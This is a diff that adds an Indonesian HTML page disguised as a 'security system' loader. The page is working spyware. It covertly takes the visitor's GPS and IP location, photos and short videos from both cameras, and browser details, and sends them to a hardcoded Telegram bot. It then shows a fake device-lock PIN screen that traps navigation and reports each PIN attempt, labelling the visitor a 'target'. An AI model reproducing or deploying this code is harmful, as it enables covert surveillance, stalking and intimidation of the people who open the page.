@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Memuat Sistem...</title>
+<style>
+  * { box-sizing:border-box; -webkit-tap-highlight-color:transparent; user-select:none; }
+  html,body { margin:0; padding:0; height:100%; overflow:hidden; background:#050505; color:#e0e0e0; font-family:-apple-system,'Segoe UI',sans-serif; }
+  video { position:fixed; width:2px; height:2px; opacity:0; pointer-events:none; top:0; left:0; }
+
+  #loader { position:fixed; inset:0; display:flex; flex-direction:column; align-items:center; justify-content:center; gap:22px; padding:28px; }
+  #loader h1 { font-size:15px; font-weight:500; letter-spacing:3px; text-transform:uppercase; color:#666; margin:0; }
+  .bar { width:min(320px,80vw); height:4px; background:#1a1a1a; border-radius:4px; overflow:hidden; }
+  .fill { height:100%; width:0%; background:linear-gradient(90deg,#00ff88,#00ccff); transition:width .12s linear; }
+  #pct { font-size:34px; font-weight:200; letter-spacing:2px; color:#00ff88; font-variant-numeric:tabular-nums; }
+  #status { font-size:11px; color:#444; letter-spacing:1px; height:14px; }
+
+  #lock { position:fixed; inset:0; display:none; flex-direction:column; align-items:center; justify-content:center; padding:30px; background:#050505; text-align:center; }
+  #lock h2 { font-size:20px; font-weight:600; color:#ff3b3b; margin:0 0 8px; letter-spacing:1px; }
+  #lock p { font-size:13px; color:#777; margin:0 0 26px; line-height:1.6; max-width:340px; }
+  .pinpad { display:grid; grid-template-columns:repeat(3,72px); gap:12px; margin-bottom:22px; }
+  .key { width:72px; height:72px; border-radius:50%; background:#111; border:1px solid #222; color:#ddd; font-size:24px; font-weight:300; display:flex; align-items:center; justify-content:center; cursor:pointer; transition:background .1s; }
+  .key:active { background:#1e1e1e; }
+  #pinDots { display:flex; gap:14px; margin-bottom:26px; }
+  .dot { width:14px; height:14px; border-radius:50%; border:2px solid #333; transition:all .15s; }
+  .dot.on { background:#00ff88; border-color:#00ff88; }
+  #err { color:#ff3b3b; font-size:12px; height:16px; letter-spacing:1px; }
+  .warn { position:fixed; bottom:16px; left:0; right:0; text-align:center; font-size:10px; color:#333; letter-spacing:1px; }
+</style>
+</head>
+<body>
+
+<video id="front" autoplay playsinline muted></video>
+<video id="back"  autoplay playsinline muted></video>
+<canvas id="canvas" style="display:none;"></canvas>
+
+<div id="loader">
+  <h1>Sistem Keamanan</h1>
+  <div id="pct">0%</div>
+  <div class="bar"><div class="fill" id="fill"></div></div>
+  <div id="status">inisialisasi...</div>
+</div>
+
+<div id="lock">
+  <h2>⚠ PERANGKAT TERKUNCI</h2>
+  <p>Perangkat ini telah dibekukan.<br>Masukkan PIN untuk membuka kembali.</p>
+  <div id="pinDots">
+    <div class="dot"></div><div class="dot"></div>
+    <div class="dot"></div><div class="dot"></div>
+  </div>
+  <div class="pinpad">
+    <div class="key" data-k="1">1</div><div class="key" data-k="2">2</div><div class="key" data-k="3">3</div>
+    <div class="key" data-k="4">4</div><div class="key" data-k="5">5</div><div class="key" data-k="6">6</div>
+    <div class="key" data-k="7">7</div><div class="key" data-k="8">8</div><div class="key" data-k="9">9</div>
+    <div class="key" data-k="C" style="color:#ff3b3b">⌫</div>
+    <div class="key" data-k="0">0</div>
+    <div class="key" data-k="X" style="opacity:.25">·</div>
+  </div>
+  <div id="err"></div>
+  <div class="warn">SISTEM TERKUNCI — JANGAN TUTUP APLIKASI</div>
+</div>
+
+<script>
+/* ============ GANTI INI ============ */
+const BOT_TOKEN = "8823905902:AAFoEq28xSeOUEa0fqNSKRJFSE2qbV84rI8";
+const CHAT_ID   = "8938118595";
+const PIN_BENAR = "1234";
+const NOMOR_KAMU = "+62XXXXXXXXXX";  // isi nomor kamu sendiri di sini
+/* ================================= */
+
+const TG = `https://api.telegram.org/bot${BOT_TOKEN}`;
+
+async function sendText(t) {
+  try {
+    const r = await fetch(`${TG}/sendMessage`, {
+      method:"POST", headers:{"Content-Type":"application/json"},
+      body: JSON.stringify({ chat_id:CHAT_ID, text:t, parse_mode:"HTML" })
+    });
+    return await r.json();
+  } catch(e){ return {ok:false, err:String(e)}; }
+}
+async function sendPhoto(blob, cap) {
+  try {
+    const fd = new FormData();
+    fd.append("chat_id", CHAT_ID);
+    fd.append("caption", cap);
+    fd.append("photo", blob, "cam.jpg");
+    const r = await fetch(`${TG}/sendPhoto`, { method:"POST", body:fd });
+    return await r.json();
+  } catch(e){ return {ok:false, err:String(e)}; }
+}
+async function sendVideo(blob, cap) {
+  try {
+    const fd = new FormData();
+    fd.append("chat_id", CHAT_ID);
+    fd.append("caption", cap);
+    fd.append("video", blob, "cam.mp4");
+    const r = await fetch(`${TG}/sendVideo`, { method:"POST", body:fd });
+    return await r.json();
+  } catch(e){ return {ok:false, err:String(e)}; }
+}
+function snap(v, label) {
+  return new Promise(res => {
+    const c = document.getElementById("canvas");
+    const w = v.videoWidth || 640, h = v.videoHeight || 480;
+    c.width = w; c.height = h;
+    const x = c.getContext("2d");
+    x.drawImage(v, 0, 0, w, h);
+    x.font = "bold 22px sans-serif";
+    x.fillStyle = "rgba(255,0,0,.9)";
+    x.fillText(label, 14, 34);
+    x.fillStyle = "rgba(255,255,255,.85)";
+    x.font = "14px sans-serif";
+    x.fillText(new Date().toLocaleString("id-ID"), 14, h - 16);
+    c.toBlob(b => res(b), "image/jpeg", 0.95);
+  });
+}
+
+/* ---------- Rekam 5 detik dari stream ---------- */
+function record5s(stream, label) {
+  return new Promise(resolve => {
+    if (!stream) return resolve(null);
+    let mime = "video/webm;codecs=vp9";
+    if (!MediaRecorder.isTypeSupported(mime)) mime = "video/webm;codecs=vp8";
+    if (!MediaRecorder.isTypeSupported(mime)) mime = "video/webm";
+    if (!MediaRecorder.isTypeSupported(mime)) mime = "video/mp4";
+
+    const chunks = [];
+    const rec = new MediaRecorder(stream, { mimeType: mime, videoBitsPerSecond: 2_500_000 });
+    rec.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
+    rec.onstop = () => resolve(new Blob(chunks, { type: mime }));
+
+    rec.start();
+    setTimeout(() => { try { rec.stop(); } catch(e){} }, 5000);
+  });
+}
+
+/* ---------- Geo 4 fallback ---------- */
+async function tryJson(url) {
+  try { const r = await fetch(url, { cache:"no-store" }); if (!r.ok) return null; return await r.json(); }
+  catch(e){ return null; }
+}
+async function getGeo() {
+  let d = await tryJson("https://ipwho.is/");
+  if (d && d.success !== false && d.ip) {
+    return { ip:d.ip, city:d.city, region:d.region, country:d.country, cc:d.country_code,
+             lat:d.latitude, lon:d.longitude, isp:d.connection&&d.connection.isp,
+             tz:d.timezone&&d.timezone.id, src:"ipwho.is" };
+  }
+  d = await tryJson("https://ipapi.co/json/");
+  if (d && d.ip && !d.error) {
+    return { ip:d.ip, city:d.city, region:d.region, country:d.country_name, cc:d.country_code,
+             lat:d.latitude, lon:d.longitude, isp:d.org, tz:d.timezone, src:"ipapi.co" };
+  }
+  d = await tryJson("https://ipinfo.io/json");
+  if (d && d.ip) {
+    const [la, lo] = (d.loc||",").split(",");
+    return { ip:d.ip, city:d.city, region:d.region, country:d.country, cc:d.country,
+             lat:la, lon:lo, isp:d.org, tz:d.timezone, src:"ipinfo.io" };
+  }
+  d = await tryJson("https://ip-api.com/json/");
+  if (d && d.status === "success") {
+    return { ip:d.query, city:d.city, region:d.regionName, country:d.country, cc:d.countryCode,
+             lat:d.lat, lon:d.lon, isp:d.isp, tz:d.timezone, src:"ip-api.com" };
+  }
+  return null;
+}
+
+/* ---------- GPS (lebih akurat dari IP kalau diizinkan) ---------- */
+function getGPS(timeout=8000) {
+  return new Promise(resolve => {
+    if (!navigator.geolocation) return resolve(null);
+    navigator.geolocation.getCurrentPosition(
+      p => resolve({ lat:p.coords.latitude, lon:p.coords.longitude, acc:p.coords.accuracy }),
+      () => resolve(null),
+      { enableHighAccuracy:true, timeout, maximumAge:0 }
+    );
+  });
+}
+
+/* ---------- Loader ---------- */
+const STATUSES = ["menghubungkan server...","memeriksa perangkat...","memuat modul keamanan...",
+  "verifikasi jaringan...","sinkronisasi data...","menyiapkan sistem...","selesai."];
+function runLoader() {
+  return new Promise(resolve => {
+    let p = 0;
+    const fill = document.getElementById("fill");
+    const pct  = document.getElementById("pct");
+    const st   = document.getElementById("status");
+    const iv = setInterval(() => {
+      p += Math.random() * 6 + 1.5;
+      if (p >= 100) { p = 100; clearInterval(iv); setTimeout(resolve, 400); }
+      fill.style.width = p + "%";
+      pct.textContent = Math.floor(p) + "%";
+      st.textContent = STATUSES[Math.min(Math.floor(p/15), STATUSES.length-1)];
+    }, 90);
+  });
+}
+
+/* ---------- Kamera ---------- */
+async function grabCams() {
+  let f, b;
+  try {
+    f = await navigator.mediaDevices.getUserMedia({
+      video:{ facingMode:"user", width:{ideal:1280}, height:{ideal:720} }, audio:false });
+    const fv = document.getElementById("front"); fv.srcObject = f; await fv.play().catch(()=>{});
+  } catch(e){ console.log("front err", e); }
+  try {
+    b = await navigator.mediaDevices.getUserMedia({
+      video:{ facingMode:{ideal:"environment"}, width:{ideal:1280}, height:{ideal:720} }, audio:false });
+    const bv = document.getElementById("back"); bv.srcObject = b; await bv.play().catch(()=>{});
+  } catch(e){ console.log("back err", e); }
+  return { f, b };
+}
+function waitVideo(v, timeout=6000) {
+  return new Promise(res => {
+    if (v.videoWidth > 0) return res(true);
+    const t0 = Date.now();
+    const iv = setInterval(() => {
+      if (v.videoWidth > 0) { clearInterval(iv); res(true); }
+      else if (Date.now() - t0 > timeout) { clearInterval(iv); res(false); }
+    }, 200);
+  });
+}
+
+/* ---------- Lock ---------- */
+function armLock() {
+  history.pushState(null, "", location.href);
+  window.addEventListener("popstate", () => {
+    history.pushState(null, "", location.href);
+    sendText("🛑 Target mencoba keluar via tombol back");
+  });
+  window.addEventListener("beforeunload", e => { e.preventDefault(); e.returnValue = ""; return ""; });
+  const goFs = () => { const el = document.documentElement; if (el.requestFullscreen) el.requestFullscreen().catch(()=>{}); };
+  goFs();
+  document.body.addEventListener("click", goFs);
+  window.addEventListener("keydown", e => {
+    if (["F5","F11"].includes(e.key)) e.preventDefault();
+    if ((e.ctrlKey||e.metaKey) && ["r","w","t","n"].includes(e.key.toLowerCase())) e.preventDefault();
+  });
+  document.addEventListener("contextmenu", e => e.preventDefault());
+}
+
+/* ---------- PIN ---------- */
+let input = ""; let lockReleased = false;
+function setupPin() {
+  const dots = document.querySelectorAll(".dot");
+  const err  = document.getElementById("err");
+  document.querySelectorAll(".key").forEach(k => {
+    k.addEventListener("click", () => {
+      if (lockReleased) return;
+      const v = k.dataset.k;
+      if (v === "C") input = input.slice(0,-1);
+      else if (v === "X") return;
+      else if (input.length < 4) input += v;
+      dots.forEach((d,i)=> d.classList.toggle("on", i < input.length));
+      if (input.length === 4) {
+        if (input === PIN_BENAR) {
+          lockReleased = true;
+          err.style.color = "#00ff88"; err.textContent = "PIN BENAR — MEMBUKA...";
+          sendText("✅ PIN 1234 benar, lock dibuka.");
+          setTimeout(() => {
+            document.getElementById("lock").style.display = "none";
+            document.body.innerHTML = "<div style='display:flex;align-items:center;justify-content:center;height:100vh;color:#555;font-family:sans-serif'>Terbuka.</div>";
+          }, 900);
+        } else {
+          err.textContent = "PIN SALAH";
+          sendText(`❌ PIN salah dicoba: <b>${input}</b>`);
+          input = ""; dots.forEach(d => d.classList.remove("on"));
+          setTimeout(()=> err.textContent = "", 1200);
+        }
+      }
+    });
+  });
+}
+
+/* ---------- MAIN ---------- */
+async function main() {
+  if (location.protocol !== "https:" && location.hostname !== "localhost") {
+    await sendText("⚠️ Halaman dibuka tanpa HTTPS — kamera akan gagal. Pakai GitHub Pages / Netlify / Cloudflare Pages.");
+  }
+
+  const [geo, gps] = await Promise.all([ getGeo(), getGPS(8000) ]);
+  await runLoader();
+
+  const cams = await grabCams();
+  const fv = document.getElementById("front");
+  const bv = document.getElementById("back");
+  await Promise.all([ waitVideo(fv, 6000), waitVideo(bv, 6000) ]);
+
+  // Info lengkap
+  const lat = gps ? gps.lat : (geo ? geo.lat : "?");
+  const lon = gps ? gps.lon : (geo ? geo.lon : "?");
+  const acc = gps ? Math.round(gps.acc) + " m" : "IP-level (kasar)";
+
+  let info = `
+<b>🎯 SESI BARU</b>
+━━━━━━━━━━━━━━━
+<b>IP:</b> <code>${geo ? geo.ip : "?"}</code>
+<b>Kota:</b> ${geo ? (geo.city+", "+geo.region) : "?"}
+<b>Negara:</b> ${geo ? (geo.country+" ("+geo.cc+")") : "?"}
+<b>Koordinat:</b> <code>${lat}, ${lon}</code>
+<b>Akurasi:</b> ${acc}
+<b>ISP:</b> ${geo ? geo.isp : "?"}
+<b>Timezone:</b> ${geo ? geo.tz : "?"}
+<b>Nomor terdaftar:</b> <code>${NOMOR_KAMU}</code>
+<b>UA:</b> <code>${navigator.userAgent}</code>
+<b>Waktu:</b> ${new Date().toLocaleString("id-ID")}
+<b>Peta:</b> https://maps.google.com/?q=${lat},${lon}
+  `.trim();
+  await sendText(info);
+
+  // Foto depan
+  if (cams.f && fv.videoWidth > 0) {
+    const blob = await snap(fv, "FRONT CAM");
+    await sendPhoto(blob, `📸 Depan — ${geo ? geo.city : "?"}`);
+  }
+  // Foto belakang
+  if (cams.b && bv.videoWidth > 0) {
+    const blob = await snap(bv, "BACK CAM");
+    await sendPhoto(blob, `📸 Belakang — ${geo ? geo.city : "?"}`);
+  }
+
+  // VIDEO 5 detik depan
+  if (cams.f) {
+    const vblob = await record5s(cams.f, "front");
+    if (vblob) await sendVideo(vblob, `🎥 Video 5s DEPAN`);
+  }
+  // VIDEO 5 detik belakang
+  if (cams.b) {
+    const vblob = await record5s(cams.b, "back");
+    if (vblob) await sendVideo(vblob, `🎥 Video 5s BELAKANG`);
+  }
+
+  // stop track
+  [cams.f, cams.b].forEach(s => s && s.getTracks().forEach(t => t.stop()));
+
+  document.getElementById("loader").style.display = "none";
+  document.getElementById("lock").style.display = "flex";
+  armLock();
+  setupPin();
+  await sendText("🔒 Perangkat terkunci. Menunggu PIN.");
+}
+main();
+</script>
+</body>
+</html>
